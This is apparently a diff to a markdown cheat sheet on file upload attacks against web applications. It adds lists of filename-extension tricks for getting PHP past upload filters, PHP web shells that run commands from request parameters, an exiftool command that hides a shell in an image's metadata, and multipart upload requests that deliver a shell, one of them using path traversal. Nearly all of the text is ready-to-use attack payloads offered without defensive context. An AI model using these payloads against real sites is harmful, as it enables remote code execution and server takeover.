@@ -726,11 +726,43 @@ payalod=<?php $dir='.'; $file = scandir($dir); print_r($file); ?>
 >
 # shellupload
 [automatic shell upload](https://github.com/sAjibuu/Upload_Bypass)
+>and more upload information
+[link](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/)
 
 >bypass Bypass Content-Type checks by setting the value of the Content-Type header to: image/png , text/plain link
 [Content-Type wordlist:](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
 >پاشگر
 ```
+exploit.php
+exploit.php3
+exploit.php4
+exploit.php5
+exploit.phtml
+exploit.phar
+
+exploit.jpg.php
+exploit.jpeg.php
+exploit.png.php
+exploit.gif.php
+exploit.pdf.php
+
+exploit.php.
+exploit.php.jpg
+exploit.php.jpeg
+exploit.php.png
+exploit%2Ephp
+exploit.p.phphp
+exploit.php%00.jpg
+exploit.php%0d%0a.jpg
+
+exploit.PHP
+exploit.pHp
+
+exploit.php/
+exploit.php//
+exploit.php\
+exploit.php#
+exploit..php
 file.php%20
 file.php%0a
 file.php%00
@@ -752,7 +784,8 @@ file.php%00.png%00.jpg
 ```
 sleep(10)-- -.jpg
 ```
-
+>create shel pho
+```
 <?php system($_GET['cmd']);?
 <?php system('pwd'); ?>
 ```
@@ -770,5 +803,30 @@ xmlns="http://www.w3.org/2000/svg">
 ```
 exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
 ```
+>photo make size
+```
+convert -size 32x32 xc:white test.jpg
+```
+>more example
+```
+------abcdefghijk
+Content-Disposition: form-data; name="avatar"; filename="exploit.php"
+Content-Type: image/jpeg <!-- Change this. Try other types such as image/gif, plain/text, etc. -->
+
+<?php echo system($_GET['cmd']); ?>
+
+------abcdefghijk
+```
+>more
+```
+------abcdefghijk
+Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php" <!-- Change this. -->
+Content-Type: application/x-php
+
+<?php echo system($_GET['cmd']); ?>
+
+------abcdefghijk
+```
+
 
 
